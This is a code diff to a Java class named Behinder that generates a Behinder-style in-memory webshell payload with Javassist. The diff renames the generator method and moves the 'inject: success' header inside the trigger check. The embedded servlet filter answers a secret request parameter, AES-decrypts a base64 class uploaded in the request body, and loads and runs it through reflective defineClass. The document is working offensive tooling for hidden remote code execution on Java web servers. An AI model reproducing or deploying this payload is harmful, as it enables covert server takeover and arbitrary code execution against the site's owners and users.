@@ -17,7 +17,7 @@ public class Behinder {
      * @throws Exception
      */
 
-    public static byte[] getMemBehinder3(String pass) throws Exception {
+    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
         //String pass = "rebeyond";
 
         ClassPool classPool = ClassPool.getDefault();
@@ -61,8 +61,8 @@ public class Behinder {
                 "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                 "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                 "\n" +
-                "            response.setHeader(\"inject\", \"success\");\n" +
                 "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
+                "            response.setHeader(\"inject\", \"success\");\n" +
                 "            String k = md5(passwd);\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
@@ -70,13 +70,12 @@ public class Behinder {
                 "                pageContext.setRequest(servletRequest);\n" +
                 "                pageContext.setResponse(servletResponse);\n" +
                 "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
-                "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec((session.getValue(\"u\") + \"\").getBytes(), \"AES\");\n" +
+                "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\");\n" +
                 "                c.init(2, sec);\n" +
                 "                String upload = request.getReader().readLine();\n" +
                 "                java.lang.reflect.Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                 "                method.setAccessible(true);\n" +
                 "                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(upload));\n" +
-                "//                Class evilclass = (Class) method.invoke(.class.getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                 "                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                 "                evilclass.newInstance().equals(pageContext);\n" +
                 "            }catch (Exception e){\n" +
